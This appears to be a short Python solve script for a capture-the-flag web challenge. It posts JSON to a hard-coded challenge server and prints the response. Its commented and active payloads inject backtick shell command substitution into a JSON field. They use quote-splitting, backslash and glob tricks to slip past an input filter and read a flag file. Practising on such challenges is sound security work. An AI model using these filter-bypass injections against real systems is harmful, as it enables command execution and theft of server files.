import requests
from bs4 import BeautifulSoup

def send_json_to_form(json_data):
    url = 'http://140.115.59.7:12001/'

    # Set the data to be sent
    data = {
        'json': json_data
    }

    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            tag_content = soup.find('pre').text.strip()
            print("Content within <pre> tags:")
            print(tag_content)
        else:
            print("Error occurred, unable to send JSON data to the form.")
    except requests.RequestException as e:
        print("An exception occurred:", e)

# JSON data to send
'''
is_input_safe
'''
# json_to_send = '{"tenshi": "Ijichi Nijika", "bocchi": "Goto Hitor-"}'
# json_to_send = '{"bocchi": "Goto Hitor-"}'

'''
is_input_safe but not show anything in <pre> tag
'''
# json_to_send = '{"tenshi": "Ijichi Nijika", %%"bocchi"%%: "Goto Hitor-"}'
# json_to_send = '{"tenshi": "Ijichi Nijika", %%"bocchi"%%```: "Goto Hitor-"'
# json_to_send = '{"tenshi": "Ijichi Nijika", %%"bocchi"%%```: "Goto Hitor-"'
# json_to_send = '{bocchi: "Goto Hitori"}'
# json_to_send = '{bocchi: Goto Hitori}'
# json_to_send = '{"bocchi": "Goto Hitor-"}'


# json_to_send = '''{"bocchi":"'`tac f[l]ag`'"}'''
# json_to_send = '''{"bocchi":"'`c\at fl\ag"}'''
# json_to_send = '''{"tenshi": "Ijichi Nijika", "bocchi":"'`tac f[l]ag`'"}'''
# json_to_send = '''{"bocchi":"'`tac f[l]ag`'"}'''
json_to_send = '''{"bocchi":"'`c""at fl""ag`'"}'''

# Call the function to send JSON data to the form
send_json_to_form(json_to_send)
